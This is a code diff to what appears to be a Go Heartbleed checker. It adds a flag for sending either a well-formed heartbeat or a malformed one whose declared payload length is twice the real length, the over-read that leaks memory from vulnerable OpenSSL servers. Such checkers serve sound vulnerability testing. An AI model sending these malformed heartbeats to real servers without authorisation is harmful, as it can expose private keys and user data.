@@ -25,7 +25,7 @@ var Safe = errors.New("heartbleed: no response or payload not found")
 var Closed = errors.New("heartbleed: the site closed/reset the connection (usually a safe reaction to the heartbeat)")
 var Timeout = errors.New("heartbleed: timeout")
 
-var padding = []byte(" YELLOW SUBMARINE ")
+var padding = []byte("xpaddingpaddingx")
 
 // struct {
 //    uint8  type;
@@ -33,13 +33,19 @@ var padding = []byte(" YELLOW SUBMARINE ")
 //    opaque payload[HeartbeatMessage.payload_length];
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
-func buildEvilMessage(payload []byte, host string) []byte {
+func buildMessage(payload []byte, doGood bool) []byte {
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
 		panic(err)
 	}
-	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
+	if doGood {
+		err = binary.Write(&buf, binary.BigEndian,
+			uint16(len(payload)))
+	} else {
+		err = binary.Write(&buf, binary.BigEndian,
+			uint16(len(payload)*2))
+	}
 	if err != nil {
 		panic(err)
 	}
@@ -51,14 +57,11 @@ func buildEvilMessage(payload []byte, host string) []byte {
 	if err != nil {
 		panic(err)
 	}
-	_, err = buf.WriteString(host)
-	if err != nil {
-		panic(err)
-	}
 	return buf.Bytes()
 }
 
-func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
+func Heartbleed(tgt *Target, payload []byte,
+		skipVerify bool, sendGoodRequest bool) (string, error) {
 	host := tgt.HostIp
 	if strings.Index(host, ":") == -1 {
 		host = host + ":443"
@@ -86,7 +89,7 @@ func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
 		return "", err
 	}
 
-	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)))
+	err = conn.SendHeartbeat([]byte(buildMessage(payload, sendGoodRequest)))
 	if err != nil {
 		return "", err
 	}
